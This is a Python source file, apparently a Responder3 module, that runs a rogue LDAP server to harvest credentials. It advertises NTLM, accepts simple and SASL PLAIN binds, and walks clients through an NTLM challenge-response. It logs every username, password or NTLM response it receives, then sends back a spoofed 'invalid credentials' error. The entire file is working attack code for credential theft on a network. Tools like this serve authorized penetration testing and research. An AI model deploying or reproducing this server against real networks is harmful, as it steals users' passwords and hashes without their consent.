#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
# Module to grab LDAP credentials

import logging
import asyncio


from responder3.core.logging.logger import *
from responder3.core.asyncio_helpers import R3ConnectionClosed
from responder3.core.commons import *
from responder3.protocols.LDAP import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession
from responder3.protocols.authentication.NTLM import *

class LDAPSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
		self.auth_type = None
		self.auth_handler = None
		self.is_authed = False
		self.parser = LdapParser

	def __repr__(self):
		t  = '== LDAPSession ==\r\n'
		return t


class LDAP(ResponderServer):
	def init(self):
		self.parse_settings()
		
	def parse_settings(self):
		pass

	async def send_search_done(self, msg_id):
		t = {
			'resultCode' : 0, # succsess
			'matchedDN' : b'',
			'diagnosticMessage' : b'',
		}
		po = {'searchResDone' : SearchResultDone(t)}
		b= {
			'messageID' : msg_id,
			'protocolOp' : protocolOp(po),					
		}

		resp = LDAPMessage(b)
		self.cwriter.write(resp.dump())
		await self.cwriter.drain()


	async def send_search_result(self, msg_id, search_result_dict):
		po = {'searchResEntry' : SearchResultEntry(search_result_dict)}

		b= {
			'messageID' : msg_id,
			'protocolOp' : protocolOp(po),					
		}
		resp = LDAPMessage(b)
		self.cwriter.write(resp.dump())
		await self.cwriter.drain()

		await self.send_search_done(msg_id)
		

	async def send_capabilities(self, msg_id):
		x = [
				{
					'type' : b'supportedCapabilities',
					'attributes': [
						'1.2.840.113556.1.4.800'.encode(),
						'1.2.840.113556.1.4.1670'.encode(),
						'1.2.840.113556.1.4.1791'.encode(),
						'1.2.840.113556.1.4.1935'.encode(),
						'1.2.840.113556.1.4.1935'.encode(),
						'1.2.840.113556.1.4.2080'.encode(),
						'1.2.840.113556.1.4.2237'.encode(),
					],
				},
			]
		t = {
			'objectName' : b'', # invalidcredz
			'attributes' : PartialAttributeList(x),
		}
		await self.send_search_result(msg_id, t)

	async def send_sasl_mechanisms(self, msg_id):
		x = [
				{
					'type' : b'supportedSASLMechanisms',
					'attributes': [
						#'GSSAPI'.encode(),
						#'GSS-SPNEGO'.encode(),
						#'DIGEST-MD5'.encode(),
						#'EXTERNAL'.encode(),
						'NTLM'.encode(),
						],
				},
			]
		t = {
			'objectName' : b'', # invalidcredz
			'attributes' : PartialAttributeList(x),
		}
		await self.send_search_result(msg_id, t)		

	async def send_unauthorized_msg(self, msg_id):
		t = {
			'resultCode' : 49, # invalidcredz
			'matchedDN' : b'',
			'diagnosticMessage' : '8009030C: LdapErr: DSID-0C0906A1, comment: AcceptSecurityContext error, data 52e, v3839'.encode(),
		}
		po = {'bindResponse' : BindResponse(t)}
		b= {
			'messageID' : msg_id,
			'protocolOp' : protocolOp(po),					
		}
		resp = LDAPMessage(b)
		
		
		self.cwriter.write(resp.dump())
		await self.cwriter.drain()
		return

	@r3trafficlogexception
	async def run(self):
		while not self.shutdown_evt.is_set():
			try:
				result = await asyncio.gather(*[asyncio.wait_for(self.session.parser.from_streamreader(self.creader), timeout=None)], return_exceptions=True)
			except asyncio.CancelledError as e:
				raise e
			if isinstance(result[0], R3ConnectionClosed):
				return
			elif isinstance(result[0], Exception):
				raise result[0]
			else:
				msg = result[0]
					
			req = msg.native

			#### Currenly we only support bindrequest, but windows adexplorer for example polls the capabilities first
			#### That is not implement currently :(
			#### TODO! 
			#print(type(msg['protocolOp'].chosen))
			if not isinstance(msg['protocolOp'].chosen, BindRequest):
				if req['protocolOp']['attributes'][0] == b'supportedCapabilities':
					await self.send_capabilities(req['messageID'])
					continue

				elif req['protocolOp']['attributes'][0] == b'supportedSASLMechanisms':
					await self.send_sasl_mechanisms(req['messageID'])
					continue
			####
			
			if self.session.is_authed == False:
				
				msg_id = req['messageID']
				bindreq = msg['protocolOp'].chosen
				auth_data = req['protocolOp']['authentication']
				auth_type = bindreq['authentication'].chosen
											
				if not self.session.auth_type:
					if isinstance(auth_type, (SicilyPackageDiscovery, SicilyNegotiate)):
						self.session.auth_type = 'NTLM'
						self.auth_handler = NTLMAUTHHandler()
						self.auth_handler.setup()
						
					elif isinstance(auth_type, SaslCredentials):
						#extend here if you with to support other SASL types
						if auth_data['mechanism'] == b'PLAIN':
							username, password = auth_data['credentials'][1:].split(b'\x00')
							cred = Credential(
									credtype = 'SASL - PLAIN',
									username = username.decode(), 
									password = password.decode(),
									fullhash='%s:%s' % (username.decode(), password.decode())		
								)
							await self.logger.credential(cred)
							
						await self.send_unauthorized_msg(msg_id)
						return
							
					elif isinstance(auth_type, core.OctetString):
						cred = Credential(
									credtype = 'PLAIN',
									username = req['protocolOp']['name'].decode(), 
									password = req['protocolOp']['authentication'].decode(),
									fullhash='%s:%s' % (req['protocolOp']['name'].decode(), req['protocolOp']['authentication'].decode())		
								)
						await self.logger.credential(cred)
						await self.send_unauthorized_msg(msg_id)
						return
						
						
							
				if self.session.auth_type == 'NTLM':
					if isinstance(auth_type, SicilyPackageDiscovery):
						t = {
							'resultCode' : 0,
							'matchedDN' : 'NTLM'.encode(),
							'diagnosticMessage' : b'',
								
						}
						po = {'bindResponse' : BindResponse(t)}
						b= {
							'messageID' : msg_id,
							'protocolOp' : protocolOp(po),					
						}
						resp = LDAPMessage(b)
							
							
						self.cwriter.write(resp.dump())
						await self.cwriter.drain()
						continue
							
					elif isinstance(auth_type, SicilyNegotiate) and isinstance(self.auth_handler, NTLMAUTHHandler):
						status, challenge = self.auth_handler.do_auth(auth_data)
						t = {
							'resultCode' : 0,
							'matchedDN' : challenge,
							'diagnosticMessage' : b'',
							
						}
						po = {'bindResponse' : BindResponse(t)}
						b= {
							'messageID' : msg_id,
							'protocolOp' : protocolOp(po),					
						}
						resp = LDAPMessage(b)
							
							
						self.cwriter.write(resp.dump())
						await self.cwriter.drain()
						
					elif isinstance(auth_type, SicilyResponse) and isinstance(self.auth_handler, NTLMAUTHHandler):
						status, cred  = self.auth_handler.do_auth(auth_data)
						if cred:
							await self.logger.credential(cred.to_credential())
									
						await self.send_unauthorized_msg(msg_id)
						return
							
				else:
					raise Exception('Unknown auth type!')